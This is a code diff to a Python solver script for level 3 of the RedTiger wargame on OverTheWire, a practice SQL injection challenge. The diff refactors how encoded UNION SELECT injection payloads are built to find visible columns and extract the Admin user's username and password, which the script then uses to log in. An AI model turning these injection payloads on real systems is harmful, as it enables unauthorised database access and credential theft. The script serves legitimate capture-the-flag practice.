@@ -53,8 +53,13 @@ def encrypt_php(cryptstr: str):
 
 
 def main():
+    '''
+    Target: Get the password of the user Admin.
+    Hint: Try to get an error. Tablename: level3_users
+    '''
     base_name = 'level3_users'
     url = "https://redtiger.labs.overthewire.org/level3.php"
+    admin_encode_param = 'MDQyMjExMDE0MTgyMTQw'
     finds = ['username', 'password']  # what we are finding
     pass_r = 'The password for the next level is: '
 
@@ -92,10 +97,12 @@ def main():
     list_of_columns = [str(c + 1) for c in range(columns)]
 
     # Search for visible columns
-    list_of_visible, html_visible = tg.find_visible_columns(
-        url, len(list_of_columns),
-        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin'#",
-        'usr', 'MDQyMjExMDE0MTgyMTQw', cook, fun)
+    encode_payload = fun(
+        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin'#")
+    payload = dict(usr=encode_payload)
+    p_base = dict(usr=admin_encode_param)
+    list_of_visible, html_visible = tg.find_visible_columns(url, len(list_of_columns),
+                                                            payload, p_base, cook)
 
     # Search for the desired data
     if len(finds) <= len(list_of_visible):
@@ -104,8 +111,12 @@ def main():
     else:
         print('too small visible list')
         exit(1)
+
+    encode_payload = fun(
+        f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin' #")
+    payload = dict(usr=encode_payload)
     keys = tg.find_param(url, len(finds), html_visible,
-                         f"' union select {','.join(list_of_columns)} from {base_name} where username='Admin' #", 'usr', cook, fun)
+                         payload, cook)
 
     # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
